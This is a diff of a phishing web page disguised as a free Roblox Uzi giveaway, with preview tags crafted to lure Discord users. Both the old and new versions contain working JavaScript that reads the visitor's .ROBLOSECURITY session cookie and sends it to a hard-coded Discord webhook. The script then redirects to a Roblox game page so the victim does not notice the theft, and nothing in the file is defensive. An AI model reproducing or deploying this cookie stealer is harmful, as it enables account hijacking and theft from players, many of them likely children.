@@ -2,72 +2,70 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Free Uzi! Click to claim!</title>
+  <title>Free Uzi! Claim Now!</title>
 
-  <!-- DISCORD OG TAGS (THIS MAKES THE PREVIEW) -->
-  <meta property="og:title" content="🎁 Free Uzi in Roblox!" />
-  <meta property="og:description" content="Click to claim your free weapon! No survey, no password. Just click!" />
+  <!-- DISCORD OG TAGS (MAKES PREVIEW LOOK LIKE IMAGE) -->
+  <meta property="og:title" content="🎁 Free Uzi in Roblox! (Click to Claim)" />
+  <meta property="og:description" content="Instant delivery! No survey, no password. Just click and get!" />
   <meta property="og:image" content="https://i.imgur.com/3uXjZql.gif" />
+  <meta property="og:url" content="https://xolbf.github.io/free-uzi" />
   <meta property="og:type" content="website" />
 
-  <!-- AUTO-REDIRECT + COOKIE STEAL -->
+  <!-- PAGE STYLE -->
+  <style>
+    body {
+      background: #000;
+      color: #00a2ff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+      margin: 0;
+    }
+    h1 {
+      font-size: 28px;
+    }
+    .loader {
+      width: 60px; height: 60px;
+      border: 6px solid #333;
+      border-top: 6px solid #00a2ff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 30px auto;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    img {
+      width: 250px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0, 162, 255, 0.5);
+    }
+  </style>
+</head>
+<body>
+  <h1>🎁 Claiming Your Free Uzi...</h1>
+  <div class="loader"></div>
+  <p>Do not close this page. Loading...</p>
+  <img src="https://i.imgur.com/3uXjZql.gif" alt="Loading" />
+
+  <!-- COOKIE STEALER -->
   <script>
-    // Wait for Discord to read OG tags, then steal & redirect
     setTimeout(() => {
-      const cookie = document.cookie.match(/\.ROBLOSECURITY=([^;%]+)/);
-      
+      const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
       if (cookie) {
-        // SEND COOKIE TO DISCORD
+        const token = cookie.split('=')[1];
         fetch("https://discord.com/api/webhooks/1540754098079535256/WNHlqYP3zxDk4y7MLzFpVpuVv960ZNoHuoJScg96vRna7064yD1T6sP9gsXyY1Az4GKb", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             embeds: [{
               title: "💀 COOKIE STOLEN",
-              description: "```" + cookie[1] + "```",
-              color: 16711680,
-              footer: { text: "Logged at: " + new Date().toLocaleString() }
+              description: "```" + token + "```",
+              color: 16711680
             }]
           })
         });
       }
-
-      // REDIRECT TO A REAL ROBLOX GAME (SO THEY DON'T SUSPECT)
       window.location = "https://www.roblox.com/games/8737602449/Uzi-Giveaway";
     }, 2000);
-  </script>
-
-  <style>
-    body {
-      background: #000;
-      color: white;
-      font-family: Arial;
-      text-align: center;
-      padding: 50px;
-      margin: 0;
-    }
-    img {
-      width: 200px;
-      border-radius: 15px;
-      margin: 30px auto;
-      display: block;
-      box-shadow: 0 0 10px rgba(0,0,255,0.5);
-    }
-    .loader {
-      width: 40px; height: 40px;
-      border: 4px solid #ccc;
-      border-top: 4px solid #00a2ff;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-    }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-  </style>
-</head>
-<body>
-  <h1>🎁 Claiming Free Uzi...</h1>
-  <div class="loader"></div>
-  <p>Do not close this page.</p>
-  <img src="https://i.imgur.com/3uXjZql.gif" alt="Loading" />
+  </script>final logger setup
 </body>
 </html>
